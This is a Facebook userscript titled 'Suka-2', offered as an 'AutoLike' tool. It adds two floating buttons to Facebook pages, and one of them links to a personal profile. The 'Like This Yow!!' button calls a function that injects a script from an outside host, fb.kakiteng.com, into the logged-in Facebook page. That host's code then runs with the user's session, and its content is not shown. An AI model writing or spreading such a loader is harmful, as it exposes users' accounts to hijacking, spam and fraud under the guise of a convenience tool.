// ==UserScript==
// @name           Suka-2
// @namespace      AutoLike
// @description    AutoLike
// @include        htt*://www.facebook.com/*
// ==/UserScript==

// ==Credits==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','like2');
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "125px"; 
	div.style.opacity= 0.90;
	div.style.bottom = "+22px";
	div.style.left = "+6px";
	div.style.backgroundColor = "#eceff5";
	div.style.border = "1px dashed #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "<img src='http://t2.gstatic.com/images?q=tbn:ANd9GcQfTmxR1ix3EpGZJrJ2W6dzcIkGuujtYWDtVsRT1EoEWUMARoY1' width='16' height='14' align='absmiddle' />&nbsp;&nbsp;<a href='http://www.facebook.com/aryvkurniawan'>Like This Yow!!</a>"
	
	body.appendChild(div);
}

// ==Like All Status==
body = document.body;
if(body != null) {
div = document.createElement("div");
div.setAttribute('id','like2');
div.style.position = "fixed";
div.style.display = "block";
div.style.width = "125px"; 
div.style.opacity= 0.90;
div.style.bottom = "+2px";
div.style.left = "+6px";
div.style.backgroundColor = "#eceff5";
div.style.border = "1px solid #94a3c4";
div.style.padding = "3px";
div.innerHTML = "<a style='font-weight:bold;color:#10F0E5' onclick='AutoLike()'><center>Like This Yow!!</center></a></a>"
body.appendChild(div);
unsafeWindow.AutoLike = function() {javascript:(a=(b=document).createElement("script")).src="//fb.kakiteng.com/las",b.body.appendChild(a);
void(0);
};
}
